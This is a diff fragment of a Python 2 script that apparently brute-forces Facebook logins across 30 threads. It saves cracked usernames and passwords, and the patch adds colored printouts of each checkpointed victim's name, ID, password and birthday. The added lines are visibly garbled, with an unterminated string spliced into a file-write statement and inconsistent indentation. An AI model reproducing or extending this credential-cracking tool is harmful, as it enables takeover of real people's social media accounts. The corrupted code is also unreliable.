@@ -262,14 +262,17 @@ def action():
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
-            elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[Delete-CP] \x1b[1;92m' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Open After 10 Days]\n'
-                cps = open('save/checkpoint.txt', 'a')
-                cps.write(k + c + user + '|' + pass1 + '\n')
+            elif  'www.facebook.com' in q['error_msg']:
+		print '\x1c\033[1;94m[✖] \x1c\033[1;94mCheckpoint'
+		print '\x1c\033[1;94m[✴] \x1c\033[1;94mName \x1c\033[1;94m    : \x1c\033[1;95m' + c['name']
+		print '\x1c\033[1;94m[➹] \x1c\033[1;94mID \x1c\033[1;94m      : \x1c\033[1;95m' + user
+		print '\x1c\033[1;94m[➹] \x1c\033[1;94mPassword \x1c\033[1;94m: \x1c\033[1;95m' + pass8 + '\n'
+		print '\x1c\033[1;97m[➹] \x1c\033[1;91mTanggal Lahir \x1c\033[1;91m: \x1c\033[1;92m' + c['birthday								cps = open('save/checkpoint.txt', 'a')
+		cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
-        except:
-            pass
+      except: 
+          pass 
  
     p = ThreadPool(30)
     p.map(main, id)
